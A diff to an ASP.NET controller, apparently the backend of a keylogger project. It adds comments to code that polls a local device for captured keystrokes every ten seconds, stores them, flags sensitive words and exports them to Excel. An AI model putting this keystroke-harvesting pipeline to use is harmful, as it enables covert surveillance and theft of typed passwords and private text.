@@ -24,7 +24,7 @@ namespace KeyLoggerApi.Controllers
             _context = context;
         }
 
-        // GET: Keylogger
+        // GET: Keylogger (Home PAge)
         public async Task<IActionResult> Index()
         {
             return View(await _context.Keyloggers.ToListAsync());
@@ -72,9 +72,9 @@ namespace KeyLoggerApi.Controllers
             //string baseUrl = "http://localhost:8889/keylog2.html";
             string baseUrl = "http://192.168.4.1";
             var client = new HttpClient();
-            var data = await client.GetStringAsync(baseUrl);
+            var data = await client.GetStringAsync(baseUrl);  //retrieve data from the url
 
-            var wordList = await _context.WordLists.Select(x => x.Description).ToListAsync();
+            var wordList = await _context.WordLists.Select(x => x.Description).ToListAsync(); //query wordList to detect sensitive word
 
             if (!string.IsNullOrEmpty(data))
             {
@@ -83,14 +83,14 @@ namespace KeyLoggerApi.Controllers
                 keylogger.Keystroke = data;
                 _context.Add(keylogger);
 
-                var detections = wordList.Where(x => data.Contains(x)).ToList();
+                var detections = wordList.Where(x => data.Contains(x)).ToList(); //check whether the data contain sensitive word
                 if (detections != null)
                 {
                     foreach (var detection in detections)
                     {
                         DetectedWord detectedWord = new DetectedWord();
                         detectedWord.Description = detection;
-                        _context.Add(detectedWord);
+                        _context.Add(detectedWord); //save to database for the sensitive words
                     }
 
                 }
@@ -110,11 +110,11 @@ namespace KeyLoggerApi.Controllers
             {
                 foreach (var recurringJob in connection.GetRecurringJobs())
                 {
-                    RecurringJob.RemoveIfExists(recurringJob.Id);
+                    RecurringJob.RemoveIfExists(recurringJob.Id); //clear current job first to prevent interval
                 }
             }
 
-            RecurringJob.AddOrUpdate(() => GetKey(), "*/10 * * * * *");
+            RecurringJob.AddOrUpdate(() => GetKey(), "*/10 * * * * *");  //ping the ip on interval
 
             return Json(new { status = true });
         }
@@ -145,9 +145,9 @@ namespace KeyLoggerApi.Controllers
             List<Keylogger> dataByTime = new List<Keylogger>();
             List<KeyData> result = new List<KeyData>();
             
-            dataByDate = await _context.Keyloggers.Where(x => x.CreationDate.Date == date.Date).ToListAsync();
+            dataByDate = await _context.Keyloggers.Where(x => x.CreationDate.Date == date.Date).ToListAsync(); //query logged key from database
 
-            switch (time)
+            switch (time) //divide a day into 4 part
             {
                 case 1:
                     dataByTime = dataByDate.Where(x => x.CreationDate.Hour > 0 && x.CreationDate.Hour <= 6).ToList();
@@ -188,7 +188,7 @@ namespace KeyLoggerApi.Controllers
             }
 
             var keylogger = await _context.Keyloggers
-                .FirstOrDefaultAsync(m => m.Id == id);
+                .FirstOrDefaultAsync(m => m.Id == id); //query the data by using id
             if (keylogger == null)
             {
                 return NotFound();
@@ -204,8 +204,6 @@ namespace KeyLoggerApi.Controllers
         }
 
         // POST: Keylogger/Create
-        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
-        // more details, see http://go.microsoft.com/fwlink/?LinkId=317598.
         [HttpPost]
         [ValidateAntiForgeryToken]
         public async Task<IActionResult> Create([Bind("Id,Keystroke,CreationDate")] Keylogger keylogger)
@@ -236,8 +234,6 @@ namespace KeyLoggerApi.Controllers
         }
 
         // POST: Keylogger/Edit/5
-        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
-        // more details, see http://go.microsoft.com/fwlink/?LinkId=317598.
         [HttpPost]
         [ValidateAntiForgeryToken]
         public async Task<IActionResult> Edit(int id, [Bind("Id,Keystroke,CreationDate")] Keylogger keylogger)
@@ -252,11 +248,11 @@ namespace KeyLoggerApi.Controllers
                 try
                 {
                     _context.Update(keylogger);
-                    await _context.SaveChangesAsync();
+                    await _context.SaveChangesAsync(); //edit the data
                 }
                 catch (DbUpdateConcurrencyException)
                 {
-                    if (!KeyloggerExists(keylogger.Id))
+                    if (!KeyloggerExists(keylogger.Id)) // return error if key doesnt exist
                     {
                         return NotFound();
                     }
@@ -279,7 +275,7 @@ namespace KeyLoggerApi.Controllers
             }
 
             var keylogger = await _context.Keyloggers
-                .FirstOrDefaultAsync(m => m.Id == id);
+                .FirstOrDefaultAsync(m => m.Id == id); //query the data from the database by id
             if (keylogger == null)
             {
                 return NotFound();
@@ -294,7 +290,7 @@ namespace KeyLoggerApi.Controllers
         public async Task<IActionResult> DeleteConfirmed(int id)
         {
             var keylogger = await _context.Keyloggers.FindAsync(id);
-            _context.Keyloggers.Remove(keylogger);
+            _context.Keyloggers.Remove(keylogger); //remove the data from the database by id
             await _context.SaveChangesAsync();
             return RedirectToAction(nameof(Index));
         }
@@ -305,25 +301,25 @@ namespace KeyLoggerApi.Controllers
             {
                 List<Keylogger> allData = new List<Keylogger>();
 
-                allData = await _context.Keyloggers.ToListAsync();
+                allData = await _context.Keyloggers.ToListAsync(); //query all data from database
 
-                string contentType = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
+                string contentType = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"; //xlsx format
                 string fileName = "Keystroke_" + DateTime.Now + ".xlsx";
 
                 var workbook = new XLWorkbook();
-                IXLWorksheet worksheet = workbook.Worksheets.Add("Keystroke");
-                worksheet.Cell(1, 1).Value = "Keystroke";
+                IXLWorksheet worksheet = workbook.Worksheets.Add("Keystroke"); //sheet name
+                worksheet.Cell(1, 1).Value = "Keystroke"; //column name
                 worksheet.Cell(1, 2).Value = "Date";
                 worksheet.Cell(1, 3).Value = "Time";
 
-                for (int index = 1; index <= allData.Count; index++)
+                for (int index = 1; index <= allData.Count; index++) //insert data into column
                 {
                     worksheet.Cell(index + 1, 1).Value = allData[index - 1].Keystroke;
                     worksheet.Cell(index + 1, 2).Value = allData[index - 1].CreationDate.ToString("MM/dd/yyyy");
                     worksheet.Cell(index + 1, 3).Value = allData[index - 1].CreationDate.ToString("HH:mm:ss");
                 }
 
-                using (var stream = new MemoryStream())
+                using (var stream = new MemoryStream()) //generate excel file
                 {
                     workbook.SaveAs(stream);
                     var content = stream.ToArray();
